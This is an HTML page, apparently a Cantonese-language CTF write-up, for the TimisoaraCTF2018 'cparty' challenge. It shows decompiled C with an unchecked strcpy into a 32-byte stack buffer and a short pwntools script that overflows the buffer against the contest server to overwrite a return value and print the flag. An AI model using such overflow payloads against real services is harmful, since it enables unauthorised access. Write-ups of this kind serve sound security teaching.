@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>TimisoaraCTF2018-cparty | CatPawn</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Questionc_party.zip Solution睇睇個main先啦1234567891011121314151617181920212223242526void __cdecl __noreturn main()&amp;#123;  char v0; // [sp+58h] [bp-10h]@1  int v1; // [sp+5Ch] [bp-Ch]@1  int v2; // [sp+60h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TimisoaraCTF2018-cparty">
+<meta property="og:url" content="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-cparty/index.html">
+<meta property="og:site_name" content="CatPawn">
+<meta property="og:description" content="Questionc_party.zip Solution睇睇個main先啦1234567891011121314151617181920212223242526void __cdecl __noreturn main()&amp;#123;  char v0; // [sp+58h] [bp-10h]@1  int v1; // [sp+5Ch] [bp-Ch]@1  int v2; // [sp+60h">
+<meta property="og:updated_time" content="2018-04-22T14:48:36.527Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TimisoaraCTF2018-cparty">
+<meta name="twitter:description" content="Questionc_party.zip Solution睇睇個main先啦1234567891011121314151617181920212223242526void __cdecl __noreturn main()&amp;#123;  char v0; // [sp+58h] [bp-10h]@1  int v1; // [sp+5Ch] [bp-Ch]@1  int v2; // [sp+60h">
+  
+    <link rel="alternate" href="/atom.xml" title="CatPawn" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">CatPawn</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Buscar"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://catpawn.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-TimisoaraCTF2018-cparty" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/04/22/TimisoaraCTF2018-cparty/" class="article-date">
+  <time datetime="2018-04-22T14:40:28.000Z" itemprop="datePublished">2018-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      TimisoaraCTF2018-cparty
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h2><p><a href="c_party.zip">c_party.zip</a></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>睇睇個main先啦<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v0; <span class="comment">// [sp+58h] [bp-10h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [sp+5Ch] [bp-Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+60h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"***^^^ STaR_C_PartY ^^^***"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-- Welcome to the party --"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Password: "</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;v1, &amp;v0, <span class="built_in">stdin</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">"Failed reading user password"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( sub_8048800(v1) == <span class="number">-1059127554</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Oh, you're VIP, here's the special VIP ticket:"</span>);</span><br><span class="line">    system(<span class="string">"cat /home/party/flag"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>sub_8048800<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_8048800(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  const char *s1; // ST18_4@7</span><br><span class="line">  size_t v2; // eax@7</span><br><span class="line">  char *dest; // [sp+48h] [bp-40h]@4</span><br><span class="line">  int v5; // [sp+4Ch] [bp-3Ch]@4</span><br><span class="line">  FILE *stream; // [sp+50h] [bp-38h]@1</span><br><span class="line">  char s; // [sp+54h] [bp-34h]@1</span><br><span class="line">  int v8; // [sp+74h] [bp-14h]@1</span><br><span class="line">  const char *v9; // [sp+78h] [bp-10h]@1</span><br><span class="line"></span><br><span class="line">  v9 = a1;</span><br><span class="line">  v8 = 0;</span><br><span class="line">  memset(&amp;s, 0, 0x20u);</span><br><span class="line">  stream = fopen(&quot;/home/party/orgs_password.txt&quot;, &quot;r&quot;);</span><br><span class="line">  if ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(&quot;Failed opening organisers password file&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = 0;</span><br><span class="line">  dest = 0;</span><br><span class="line">  if ( getline(&amp;dest, &amp;v5, stream) == -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    fclose(stream);</span><br><span class="line">    perror(&quot;Failed organisers password&quot;);</span><br><span class="line">    exit(1);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  dest[strcspn(dest, &quot;\n&quot;)] = 0;</span><br><span class="line">  strcpy(&amp;s, v9);</span><br><span class="line">  s1 = dest;</span><br><span class="line">  v2 = strlen(dest);</span><br><span class="line">  if ( !strncmp(s1, &amp;s, v2) )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Good password. Now you&apos;ll get your ticket...&quot;);</span><br><span class="line">    puts(&quot;Ticket id: timctf&#123;0112-3581-3213-4558-9144&#125;&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Bad password. No ticket, go home!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  free(dest);</span><br><span class="line">  return v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>似乎我地要做到既野正係需要令到 sub_8048800 既return變做0xC0DEFEFE 就完事<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"89.38.210.128"</span>, <span class="number">31338</span>)</span><br><span class="line"></span><br><span class="line">password = <span class="number">0xc0defefe</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">32</span> + p32(password)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Password: "</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> p.recv(<span class="number">1024</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">timctf&#123;d0nt_cr4sh_th3_p4rty_b3_th3_p4rty&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://catpawn.github.io/2018/04/22/TimisoaraCTF2018-cparty/" data-id="cjgaye6m0000ifkw5ludekjil" class="article-share-link">Compartir</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/04/22/TimisoaraCTF2018-Attendance/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Nuevo</strong>
+      <div class="article-nav-title">
+        
+          TimisoaraCTF2018-Attendance
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Viejo</strong>
+      <div class="article-nav-title">TimisoaraCTF2018-NotYourAverageRSA</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archivos</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Posts recientes</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/04/22/TimisoaraCTF2018-Pshchology/">TimisoaraCTF2018-Pshchology</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/22/TimisoaraCTF2018-ForeignLanguage/">TimisoaraCTF2018-ForeignLanguage</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/22/TimisoaraCTF2018-Attendance/">TimisoaraCTF2018-Attendance</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/22/TimisoaraCTF2018-cparty/">TimisoaraCTF2018-cparty</a>
+          </li>
+        
+          <li>
+            <a href="/2018/04/22/TimisoaraCTF2018-NotYourAverageRSA/">TimisoaraCTF2018-NotYourAverageRSA</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 CatPawn<br>
+      Construido por <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
